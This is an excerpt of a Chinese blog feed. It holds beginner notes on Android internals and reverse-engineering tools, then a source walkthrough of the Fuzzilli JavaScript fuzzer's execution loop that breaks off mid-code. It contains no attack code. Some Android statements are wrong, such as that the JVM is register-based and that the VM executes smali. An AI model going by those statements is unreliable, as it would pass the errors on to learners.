    <content type="html"><![CDATA[<h1 id="Android基础"><a href="#Android基础" class="headerlink" title="Android基础"></a>Android基础</h1><p>先是从一些基本概念了解</p><h2 id="Android虚拟机"><a href="#Android虚拟机" class="headerlink" title="Android虚拟机"></a>Android虚拟机</h2><p><strong>Android虚拟机</strong>，简单来说，就是Android系统中运行应用程序的一个虚拟环境。它为每个Android应用提供了一个独立的运行空间，使得多个应用可以在同一个设备上同时运行，互不干扰。</p><h3 id="Android虚拟机分类"><a href="#Android虚拟机分类" class="headerlink" title="Android虚拟机分类"></a>Android虚拟机分类</h3><p><strong>Dalvik虚拟机（早期）：</strong> Android早期的虚拟机，Dalvik虚拟机是基于寄存器的虚拟机，它将dex字节码翻译成机器码逐条执行。</p><p><strong>ART虚拟机（目前）：</strong> Android 5.0以后引入的虚拟机，ART虚拟机是基于寄存器的虚拟机，它在应用程序安装时，会提前将dex字节码编译成机器码，这样在运行时可以显著提高应用程序的执行效率。</p><h3 id="和Java虚拟机区别"><a href="#和Java虚拟机区别" class="headerlink" title="和Java虚拟机区别"></a>和Java虚拟机区别</h3><p><strong>字节码格式不同：</strong> Android虚拟机执行的是dex字节码，而Java虚拟机执行的是class字节码。</p><p><strong>垃圾回收机制不同：</strong> 两者的垃圾回收机制也有所不同。</p><p><strong>指令集不同：</strong> 虽然都是基于寄存器的虚拟机，但指令集的细节有所差异。</p><h3 id="smali和dex"><a href="#smali和dex" class="headerlink" title="smali和dex"></a>smali和dex</h3><p><strong>smali</strong>是一种类似汇编的中间语言，它是Android虚拟机（Dalvik或ART）执行的代码。当我们用Java语言编写Android应用程序时，编译器会将Java代码编译成字节码（.class文件），然后打包成DEX（Dalvik Executable）文件，DEX文件再被进一步编译成smali代码。形象地说，smali代码就是Android虚拟机能直接理解的“机器语言”。</p><p><strong>DEX</strong>文件是Dalvik可执行文件的缩写，它是Android应用程序的核心文件。DEX文件包含了Dalvik虚拟机执行所需的所有信息，包括类定义、方法实现、常量池等。DEX文件是smali代码的集合，是应用程序在设备上运行的直接载体。</p><p><strong>smali代码是DEX文件的组成部分。</strong> 一个DEX文件包含多个smali文件。</p><p><strong>smali代码是DEX文件的低级表示。</strong> smali代码更接近于机器指令，更容易理解虚拟机的执行过程。</p><p>smali代码是DEX文件的一个中间表示，它比DEX文件更接近机器码，但又比机器码更易于理解。smali代码是Android虚拟机解释执行的。</p><table><thead><tr><th>类比对象</th><th>ELF文件</th><th>APK文件</th></tr></thead><tbody><tr><td>对应关系</td><td>代码段</td><td>smali代码</td></tr><tr><td>作用</td><td>存储可执行指令</td><td>存储Android应用程序的代码</td></tr><tr><td>格式</td><td>二进制格式</td><td>文本格式（更易读）</td></tr><tr><td>层次</td><td>更底层，直接对应机器指令</td><td>比机器码高一层，但比Java代码低一层</td></tr></tbody></table><h2 id="Android开发基础"><a href="#Android开发基础" class="headerlink" title="Android开发基础"></a>Android开发基础</h2><p>Android开发和普通Java开发的区别，可以研究以下几个方面：</p><p><strong>Android四大组件：Activity、Service、BroadcastReceiver、ContentProvider</strong></p><p><strong>Android布局管理器</strong></p><p><strong>Android生命周期</strong></p><p><strong>Android权限管理</strong></p><p><strong>Android性能优化</strong></p><h3 id="Android开发的工具和环境"><a href="#Android开发的工具和环境" class="headerlink" title="Android开发的工具和环境"></a>Android开发的工具和环境</h3><p><strong>Android Studio：</strong> 谷歌官方推荐的Android集成开发环境（IDE），提供了代码编辑、调试、构建、打包等一系列功能。</p><p><strong>Android SDK：</strong> Android软件开发工具包，包含了开发Android应用所需的API、工具和文档。</p><p><strong>Java Development Kit (JDK)：</strong> Java开发工具包，用于编译Java代码。</p><h3 id="和普通Java开发区别"><a href="#和普通Java开发区别" class="headerlink" title="和普通Java开发区别"></a>和普通Java开发区别</h3><h4 id="运行角度"><a href="#运行角度" class="headerlink" title="运行角度"></a>运行角度</h4><p>Android应用运行在Android虚拟机（Dalvik或ART）中，这个虚拟机为Android应用提供了特定的运行环境，包括UI组件、系统服务、权限管理等。普通Java应用程序通常运行在Java虚拟机（JVM）中，这个虚拟机提供了标准的Java API，用于开发各种类型的应用程序。</p><h4 id="开发角度"><a href="#开发角度" class="headerlink" title="开发角度"></a>开发角度</h4><p>虽然Android应用开发和普通Java开发都使用Java语言，但由于运行环境、UI框架、设备特性等方面的差异，Android应用开发具有其独特的特点。Android开发者需要掌握Android SDK、Android Studio等工具，以及Android特有的开发模式。</p><p><strong>Android开发虽然以Java语言为基础，但更重要的是基于Android SDK（Software Development Kit，软件开发工具包）进行开发。</strong></p><p><strong>Java语言是基础：Android应用的代码主要由Java语言编写，但Java语言只是提供了一种编写代码的语法和基础类库。</strong></p><p><strong>SDK是核心：Android SDK才是Android开发的“灵魂”。它提供了一系列的API（Application Programming Interface，应用程序编程接口），这些API封装了Android系统的底层功能。</strong></p><p>形象地说，Java语言是盖房子的砖头，而Android SDK就是图纸和施工规范。</p><h4 id="打包角度"><a href="#打包角度" class="headerlink" title="打包角度"></a>打包角度</h4><p>Android应用需要打包成APK文件，并通过Google Play或其他应用市场发布。普通Java应用程序可以打包成JAR文件、WAR文件等，发布方式也更加多样。</p><h4 id="编译角度"><a href="#编译角度" class="headerlink" title="编译角度"></a>编译角度</h4><p>首先看下普通的Java程序：</p><blockquote><p>Java 源代码被编译成 .class 文件。</p><p>如果需要进一步打包， .class 文件通常被打包成 JAR (Java Archive) 文件，用于创建可执行的 JAR 文件或部署到应用服务器的 WAR (Web Application Archive) 文件。JAR 文件可以直接运行，WAR 文件需要部署到应用服务器上才能运行。</p></blockquote><p>对于Android应用：</p><blockquote><p><strong>Java源代码编译成class文件：</strong>和普通 Java 程序一样，Android 应用的 Java 源代码也会被编译成 .class 文件。</p><p><strong>class文件转换为dex文件：</strong> 为了适应 Android 虚拟机（Dalvik 或 ART），这些 .class 文件会被进一步处理，合并成一个或者多个 DEX (Dalvik Executable) 文件。DEX 文件是 Dalvik&#x2F;ART 虚拟机可以直接执行的格式，它包含了代码、常量池、类信息等。</p><p><strong>打包成APK：</strong> DEX 文件和其他资源文件（如布局文件、图片、配置文件等）一起打包成 APK (Android Package) 文件，这就是我们最终得到的 Android 应用程序安装包。</p></blockquote><h2 id="逆向工具"><a href="#逆向工具" class="headerlink" title="逆向工具"></a>逆向工具</h2><p><strong>APKTool:</strong></p><ul><li><strong>功能:</strong> 将 APK 文件反编译成 smali 代码、资源文件等，以及重新打包成 APK。</li><li><strong>特点:</strong> 易于使用，是 Android 逆向工程的入门级工具。</li><li><strong>主要用途:</strong> 查看 APK 的结构、修改资源文件、进行简单的代码修改。</li></ul><p><strong>jadx:</strong></p><ul><li><strong>功能:</strong> 将 DEX 文件反编译成 Java 代码，可读性更强。</li><li><strong>特点:</strong> 反编译质量较高，支持调试。</li><li><strong>主要用途:</strong> 深入分析代码逻辑，定位问题。</li></ul><p><strong>JEB Decompiler:</strong></p><ul><li><strong>功能:</strong> 商业级反编译工具，支持多种文件格式，包括 APK、DEX、ELF 等。</li><li><strong>特点:</strong> 反编译质量高，提供强大的分析和调试功能，支持插件扩展。</li><li><strong>主要用途:</strong> 进行复杂的逆向分析，定位漏洞。</li></ul><p><strong>Frida:</strong></p><ul><li><strong>功能:</strong> 动态插桩工具，可以在运行时注入代码，修改程序行为。</li><li><strong>特点:</strong> 灵活强大，支持多种平台，可用于hook 系统调用、修改内存数据等。</li><li><strong>主要用途:</strong> 动态调试、脱壳、反反调试。</li></ul><p><strong>Radare2:</strong></p><ul><li><strong>功能:</strong> 开源逆向工程框架，支持多种文件格式，功能强大。</li><li><strong>特点:</strong> 可定制性强，支持脚本编写，可用于二进制分析、调试、逆向。</li><li><strong>主要用途:</strong> 深入分析二进制代码，挖掘漏洞。</li></ul><p><strong>IDA Pro:</strong></p><ul><li><strong>功能:</strong> 商业级反汇编工具，支持多种处理器架构。</li><li><strong>特点:</strong> 功能强大，可用于分析各种类型的二进制文件。</li><li><strong>主要用途:</strong> 分析 native 代码，定位漏洞。</li><li><strong>Native代码</strong>，顾名思义，就是“原生”代码。它指的是用<strong>除Java之外的其他编程语言</strong>编写的代码，并且通常是<strong>直接编译成机器码</strong>，能够高效地运行在特定的硬件平台上。Java通过<strong>JNI（Java Native Interface）</strong>机制来调用Native代码。JNI提供了一套API，允许Java代码加载动态链接库（如.so文件），并调用其中的Native方法。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzilli源码解析2</title>
    <link href="/2024/05/13/Fuzzilli%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%902/"/>
    <url>/2024/05/13/Fuzzilli%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%902/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzilli源码解析2"><a href="#Fuzzilli源码解析2" class="headerlink" title="Fuzzilli源码解析2"></a>Fuzzilli源码解析2</h1><p>今天分析的路径是fuzz的执行</p><h2 id="Fuzz执行的路径"><a href="#Fuzz执行的路径" class="headerlink" title="Fuzz执行的路径"></a>Fuzz执行的路径</h2><h3 id="执行Fuzz–main-swift"><a href="#执行Fuzz–main-swift" class="headerlink" title="执行Fuzz–main.swift"></a>执行Fuzz–main.swift</h3><p><code>fuzzer.start</code>开始启动</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// Finally, start fuzzing.</span><br><span class="hljs-keyword">for</span> fuzzer <span class="hljs-keyword">in</span> instances &#123;<br>    fuzzer.sync &#123;<br>        fuzzer.start(runFor: numIterations)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="执行Fuzz–Fuzzer-swift"><a href="#执行Fuzz–Fuzzer-swift" class="headerlink" title="执行Fuzz–Fuzzer.swift"></a>执行Fuzz–Fuzzer.swift</h3><p>可以看到接着进入<code>self.startFuzzing()</code><br><code>DispatchQueue.precondition(condition: .onQueue(queue))</code>该函数用于断言当前线程是否在指定的队列 <code>queue</code> 上执行。<br><code>fuzzGroup.notify(queue: queue) &#123; self.startFuzzing() &#125;</code>是等<code>fuzzGroup</code>中的任务都完成后，再在<code>queue</code>上执行<code>self.startFuzzing</code>。通过 <code>notify</code>，可以等待一组任务全部结束，然后再执行后续的代码。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// Starts the fuzzer and runs for the specified number of iterations.</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// This must be called after initializing the fuzzer.</span><br><span class="hljs-comment">/// Use -1 for maxIterations to run indefinitely.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">runFor</span> <span class="hljs-params">maxIterations</span>: <span class="hljs-type">Int</span>) &#123;<br>    dispatchPrecondition(condition: .onQueue(queue))<br>    <span class="hljs-built_in">assert</span>(isInitialized)<br><br>    <span class="hljs-keyword">self</span>.maxIterations <span class="hljs-operator">=</span> maxIterations<br><br>    <span class="hljs-comment">// There could currently be minimization tasks scheduled from a corpus import.</span><br>    <span class="hljs-comment">// Wait for these to complete before actually starting to fuzz.</span><br>    fuzzGroup.notify(queue: queue) &#123; <span class="hljs-keyword">self</span>.startFuzzing() &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面紧接着调用<code>fuzzOne</code></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">startFuzzing</span>() &#123;<br>    dispatchPrecondition(condition: .onQueue(queue))<br><br>    <span class="hljs-comment">// When starting with an empty corpus, perform initial corpus generation using the GenerativeEngine.</span><br>    <span class="hljs-keyword">if</span> corpus.isEmpty &#123;<br>        logger.info(<span class="hljs-string">&quot;Empty corpus detected. Switching to the GenerativeEngine to perform initial corpus generation&quot;</span>)<br>        startInitialCorpusGeneration()<br>    &#125;<br><br>    logger.info(<span class="hljs-string">&quot;Let&#x27;s go!&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> config.isFuzzing &#123;<br>        fuzzOne()<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面可以看到<code>fuzzOne</code>完成后会再次调用自己，进行迭代直到次数达到<code>maxIterations</code>。中间会调用<code>engine.fuzzOne</code></p><p>如果初始语料库是空的，在<code>startFuzzing</code>中先调用<code>startInitialCorpusGeneration</code>函数来将当前<code>engine</code>设置为<code>GenerativeEngine</code>来生成初始语料，同时设置<code>phase</code>为<code>.initialCorpusGeneration</code>，并将当前的<code>MutationEngine</code>设置为<code>nextEngine</code>，由于此时的<code>engine</code>为生成引擎，所以调用的<code>engine.fuzzOne</code>函数也是生成引擎中的<code>fuzzOne</code>函数，作用就是生成一个程序并且执行</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">startInitialCorpusGeneration</span>() &#123;<br>    nextEngine <span class="hljs-operator">=</span> engine<br>    engine <span class="hljs-operator">=</span> <span class="hljs-type">GenerativeEngine</span>(programSize: <span class="hljs-number">10</span>)<br>    engine.initialize(with: <span class="hljs-keyword">self</span>)<br>    phase <span class="hljs-operator">=</span> .initialCorpusGeneration<br>&#125;<br></code></pre></td></tr></table></figure><p>在下面<code>fuzzOne</code>函数中，<code>engine.fuzzOne</code>先调用对应引擎的<code>fuzzOne</code>函数，接着如果<code>phase</code>为<code>.initialCorpusGeneration</code>时，会进行一个<code>finishInitialCorpusGeneration</code>操作，即把突变引擎替换回来，并且设置<code>phase</code>为<code>.fuzzing</code></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">finishInitialCorpusGeneration</span>() &#123;<br>    engine <span class="hljs-operator">=</span> nextEngine<span class="hljs-operator">!</span><br>    nextEngine <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span><br>    phase <span class="hljs-operator">=</span> .fuzzing<br>&#125;<br></code></pre></td></tr></table></figure><p>下面<code>fuzzOne</code>是<code>Fuzzer</code>中的<code>fuzzOne</code>函数，通过迭代次数来控制调用自身的次数，每次调用<code>Fuzzer</code>的<code>fuzzOne</code>函数都会调用一次对应<code>engine</code>的<code>fuzzOne</code>函数</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// Performs one round of fuzzing.</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">fuzzOne</span>() &#123;<br>    dispatchPrecondition(condition: .onQueue(queue))<br>    <span class="hljs-built_in">assert</span>(config.isFuzzing)<br><br>    <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span><span class="hljs-keyword">self</span>.isStopped <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> &#125;<br><br>    <span class="hljs-keyword">guard</span> maxIterations <span class="hljs-operator">==</span> <span class="hljs-operator">-</span><span class="hljs-number">1</span> <span class="hljs-operator">||</span> iterations <span class="hljs-operator">&lt;</span> maxIterations <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> shutdown(reason: .finished)<br>    &#125;<br>    iterations <span class="hljs-operator">+=</span> <span class="hljs-number">1</span><br><br>    engine.fuzzOne(fuzzGroup)<br><br>    <span class="hljs-keyword">if</span> phase <span class="hljs-operator">==</span> .initialCorpusGeneration &#123;<br>        <span class="hljs-comment">// Perform initial corpus generation until we haven&#x27;t found a new interesting sample in the last N</span><br>        <span class="hljs-comment">// iterations. The rough order of magnitude of N has been determined experimentally: run two instances with</span><br>        <span class="hljs-comment">// different values (e.g. 10 and 100) for roughly the same number of iterations (approximately until both</span><br>        <span class="hljs-comment">// have finished the initial corpus generation), then compare the corpus size and coverage.</span><br>        <span class="hljs-keyword">if</span> iterationsSinceLastInterestingProgram <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span> &#123;<br>            <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>corpus.isEmpty <span class="hljs-keyword">else</span> &#123;<br>                logger.fatal(<span class="hljs-string">&quot;Initial corpus generation failed, corpus is still empty. Is the evaluator working correctly?&quot;</span>)<br>            &#125;<br>            logger.info(<span class="hljs-string">&quot;Initial corpus generation finished. Corpus now contains <span class="hljs-subst">\(corpus.size)</span> elements&quot;</span>)<br>            finishInitialCorpusGeneration()<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Do the next fuzzing iteration as soon as all tasks related to the current iteration are finished.</span><br>    fuzzGroup.notify(queue: queue) &#123;<br>        <span class="hljs-keyword">self</span>.fuzzOne()<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于默认使用的<code>engine</code>是<code>MutationEngine</code>，所以看下对应的<code>fuzzOne</code>，其中调用了<code>execute</code>函数</p><h3 id="执行Fuzz–MutationEngine-swift"><a href="#执行Fuzz–MutationEngine-swift" class="headerlink" title="执行Fuzz–MutationEngine.swift"></a>执行Fuzz–MutationEngine.swift</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// Perform one round of fuzzing.</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// High-level fuzzing algorithm:</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">///     let parent = pickSampleFromCorpus()</span><br><span class="hljs-comment">///     repeat N times:</span><br><span class="hljs-comment">///         let current = mutate(parent)</span><br><span class="hljs-comment">///         execute(current)</span><br><span class="hljs-comment">///         if current produced crashed:</span><br><span class="hljs-comment">///             output current</span><br><span class="hljs-comment">///         elif current resulted in a runtime exception or a time out:</span><br><span class="hljs-comment">///             // do nothing</span><br><span class="hljs-comment">///         elif current produced new, interesting behaviour:</span><br><span class="hljs-comment">///             minimize and add to corpus</span><br><span class="hljs-comment">///         else</span><br><span class="hljs-comment">///             parent = current</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// This ensures that samples will be mutated multiple times as long</span><br><span class="hljs-comment">/// as the intermediate results do not cause a runtime exception.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">fuzzOne</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">group</span>: <span class="hljs-type">DispatchGroup</span>) &#123;<br>    <span class="hljs-keyword">var</span> parent <span class="hljs-operator">=</span> fuzzer.corpus.randomElementForMutating()<br>    <span class="hljs-keyword">var</span> program <span class="hljs-operator">=</span> parent<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span>numConsecutiveMutations &#123;<br>        <span class="hljs-keyword">var</span> mutator <span class="hljs-operator">=</span> fuzzer.mutators.randomElement()<br>        <span class="hljs-keyword">var</span> mutated <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br>        <span class="hljs-keyword">for</span> <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span><span class="hljs-number">10</span> &#123;<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> mutator.mutate(parent, for: fuzzer) &#123;<br>                program <span class="hljs-operator">=</span> result<br>                mutated <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>                mutator.stats.producedSample(addingInstructions: program.size <span class="hljs-operator">-</span> parent.size)<br>                <span class="hljs-keyword">break</span><br>            &#125;<br>            logger.verbose(<span class="hljs-string">&quot;<span class="hljs-subst">\(mutator.name)</span> failed, trying different mutator&quot;</span>)<br>            mutator.stats.failedToGenerateSample()<br>            mutator <span class="hljs-operator">=</span> fuzzer.mutators.randomElement()<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>mutated &#123;<br>            logger.warning(<span class="hljs-string">&quot;Could not mutate sample, giving up. Sample:<span class="hljs-subst">\n</span><span class="hljs-subst">\(fuzzer.lifter.lift(parent))</span>&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br><br>        <span class="hljs-keyword">let</span> outcome <span class="hljs-operator">=</span> execute(program, stats: <span class="hljs-operator">&amp;</span>mutator.stats)<br><br>        <span class="hljs-comment">// Mutate the program further if it succeeded.</span><br>        <span class="hljs-keyword">if</span> .succeeded <span class="hljs-operator">==</span> outcome &#123;<br>            parent <span class="hljs-operator">=</span> program<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>execute</code>函数定义在父类<code>FuzzEngine</code>中</p><h3 id="执行Fuzz–FuzzEngine-swift"><a href="#执行Fuzz–FuzzEngine-swift" class="headerlink" title="执行Fuzz–FuzzEngine.swift"></a>执行Fuzz–FuzzEngine.swift</h3><p>可以看到又调用了<code>fuzzer.execute</code>来执行</p><p>这里根据传回来的结果，对样本程序做一个处理</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">execute</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">program</span>: <span class="hljs-type">Program</span>, <span class="hljs-params">stats</span>: <span class="hljs-keyword">inout</span> <span class="hljs-type">ProgramProducerStats</span>) -&gt; <span class="hljs-type">ExecutionOutcome</span> &#123;<br>        fuzzer.dispatchEvent(fuzzer.events.<span class="hljs-type">ProgramGenerated</span>, data: program)<br><br>        <span class="hljs-keyword">let</span> execution <span class="hljs-operator">=</span> fuzzer.execute(program)<br><br>        <span class="hljs-keyword">switch</span> execution.outcome &#123;<br>            <span class="hljs-keyword">case</span> .crashed(<span class="hljs-keyword">let</span> termsig):<br>                fuzzer.processCrash(program, withSignal: termsig, withStderr: execution.stderr, withStdout: execution.stdout, origin: .local)<br><br>            <span class="hljs-keyword">case</span> .succeeded:<br>                fuzzer.dispatchEvent(fuzzer.events.<span class="hljs-type">ValidProgramFound</span>, data: program)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> aspects <span class="hljs-operator">=</span> fuzzer.evaluator.evaluate(execution) &#123;<br>                    <span class="hljs-keyword">if</span> fuzzer.config.inspection.contains(.history) &#123;<br>                        program.comments.add(<span class="hljs-string">&quot;Program is interesting due to <span class="hljs-subst">\(aspects)</span>&quot;</span>, at: .footer)<br>                    &#125;<br>                    fuzzer.processInteresting(program, havingAspects: aspects, origin: .local)<br>                &#125;<br>                stats.producedValidSample()<br><br>            <span class="hljs-keyword">case</span> .failed(<span class="hljs-keyword">_</span>):<br>                <span class="hljs-keyword">if</span> fuzzer.config.enableDiagnostics &#123;<br>                    program.comments.add(<span class="hljs-string">&quot;Stdout:<span class="hljs-subst">\n</span>&quot;</span> <span class="hljs-operator">+</span> execution.stdout, at: .footer)<br>                &#125;<br>                fuzzer.dispatchEvent(fuzzer.events.<span class="hljs-type">InvalidProgramFound</span>, data: program)<br>                stats.producedInvalidSample()<br><br>            <span class="hljs-keyword">case</span> .timedOut:<br>                fuzzer.dispatchEvent(fuzzer.events.<span class="hljs-type">TimeOutFound</span>, data: program)<br>                stats.producedInvalidSample()<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> fuzzer.config.enableDiagnostics &#123;<br>            <span class="hljs-comment">// Ensure deterministic execution behaviour. This can for example help detect and debug REPRL issues.</span><br>            ensureDeterministicExecutionOutcomeForDiagnostic(of: program)<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> execution.outcome<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="执行Fuzz–Fuzzer-swift-1"><a href="#执行Fuzz–Fuzzer-swift-1" class="headerlink" title="执行Fuzz–Fuzzer.swift"></a>执行Fuzz–Fuzzer.swift</h3><p>下面调用了<code>runner.run</code>，<code>runner</code>是<code>REPRL</code>，所以接着跟进<code>runner.run</code></p><p><code>lifter.lift</code>可以将<code>FuzzIL</code>转为<code>JS代码</code></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">/// Executes a program.</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// This will first lift the given FuzzIL program to the target language, then use the configured script runner to execute it.</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// - Parameters:</span><br><span class="hljs-comment">///   - program: The FuzzIL program to execute.</span><br><span class="hljs-comment">///   - timeout: The timeout after which to abort execution. If nil, the default timeout of this fuzzer will be used.</span><br><span class="hljs-comment">/// - Returns: An Execution structure representing the execution outcome.</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">execute</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">program</span>: <span class="hljs-type">Program</span>, <span class="hljs-params">withTimeout</span> <span class="hljs-params">timeout</span>: <span class="hljs-type">UInt32</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>) -&gt; <span class="hljs-type">Execution</span> &#123;<br>    dispatchPrecondition(condition: .onQueue(queue))<br>    <span class="hljs-built_in">assert</span>(runner.isInitialized)<br><br>    <span class="hljs-keyword">let</span> script <span class="hljs-operator">=</span> lifter.lift(program)<br><br>    dispatchEvent(events.<span class="hljs-type">PreExecute</span>, data: program)<br>    <span class="hljs-keyword">let</span> execution <span class="hljs-operator">=</span> runner.run(script, withTimeout: timeout <span 